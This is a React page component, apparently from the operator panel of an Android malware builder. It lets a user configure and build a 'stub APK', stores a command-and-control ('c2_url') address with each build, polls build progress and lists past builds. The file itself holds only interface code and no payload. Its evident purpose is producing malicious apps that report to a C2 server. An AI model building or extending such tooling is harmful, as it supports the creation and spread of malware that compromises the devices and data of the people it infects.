import { useState, useEffect } from 'react';
import { useAPI } from '../hooks/useAPI.js';
import { getBuilds, createBuild, getBuild } from '../lib/api.js';
import BuildForm from '../components/BuildForm.jsx';
import BuildProgress from '../components/BuildProgress.jsx';

export default function Builder() {
  const [building, setBuilding] = useState(false);
  const [currentBuildId, setCurrentBuildId] = useState(null);
  const [currentBuild, setCurrentBuild] = useState(null);

  const { data: buildsData, refetch: refetchBuilds } = useAPI(getBuilds);

  // Poll the current build for status updates
  useEffect(() => {
    if (!currentBuildId) return;
    const timer = setInterval(async () => {
      try {
        const data = await getBuild(currentBuildId);
        setCurrentBuild(data.build);
        if (data.build.status === 'success' || data.build.status === 'failed') {
          clearInterval(timer);
          refetchBuilds();
        }
      } catch {
        clearInterval(timer);
      }
    }, 2000);
    return () => clearInterval(timer);
  }, [currentBuildId, refetchBuilds]);

  const handleBuild = async (formData) => {
    setBuilding(true);
    try {
      const data = await createBuild(formData);
      setCurrentBuildId(data.buildId);
      setCurrentBuild({
        id: data.buildId,
        status: 'queued',
        package_name: data.packageName,
        build_config: formData.buildConfig,
        c2_url: formData.c2Url,
        created_at: new Date().toISOString(),
      });
      refetchBuilds();
    } catch (err) {
      alert('Build failed: ' + err.message);
    } finally {
      setBuilding(false);
    }
  };

  const builds = buildsData?.builds || [];

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-slide-in">
      <div>
        <h1 className="text-lg font-semibold text-gray-100 mb-1">APK Builder</h1>
        <p className="text-xs text-surface-400 mb-6">Configure and build the stub APK</p>
        <div className="bg-surface-900 border border-surface-800 rounded-lg p-5">
          <BuildForm onSubmit={handleBuild} loading={building} />
        </div>
      </div>

      <div className="space-y-6">
        {/* Current build */}
        <div>
          <h2 className="text-sm font-medium text-gray-100 mb-3">Current Build</h2>
          <BuildProgress build={currentBuild} />
        </div>

        {/* Build history */}
        <div>
          <h2 className="text-sm font-medium text-gray-100 mb-3">
            Build History
            <span className="text-surface-500 ml-2 text-xs">({builds.length})</span>
          </h2>
          <div className="bg-surface-900 border border-surface-800 rounded-lg max-h-80 overflow-y-auto">
            {builds.length === 0 && (
              <p className="text-xs text-surface-500 text-center py-4">No builds yet</p>
            )}
            {builds.map(build => (
              <div
                key={build.id}
                className="flex items-center gap-3 px-4 py-2.5 border-b border-surface-800 last:border-0 text-xs cursor-pointer hover:bg-surface-800/50 transition-colors"
                onClick={() => setCurrentBuild(build)}
              >
                <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${
                  build.status === 'success' ? 'bg-success' :
                  build.status === 'failed' ? 'bg-danger' :
                  build.status === 'running' ? 'bg-warning animate-pulse' :
                  'bg-surface-500'
                }`} />
                <span className="text-surface-400 font-mono">{build.id?.slice(0, 12)}...</span>
                <span className="text-gray-300 flex-1 truncate">{build.package_name || '—'}</span>
                <span className={`${
                  build.status === 'success' ? 'text-success' :
                  build.status === 'failed' ? 'text-danger' :
                  build.status === 'running' ? 'text-warning' :
                  'text-surface-400'
                }`}>
                  {build.status}
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
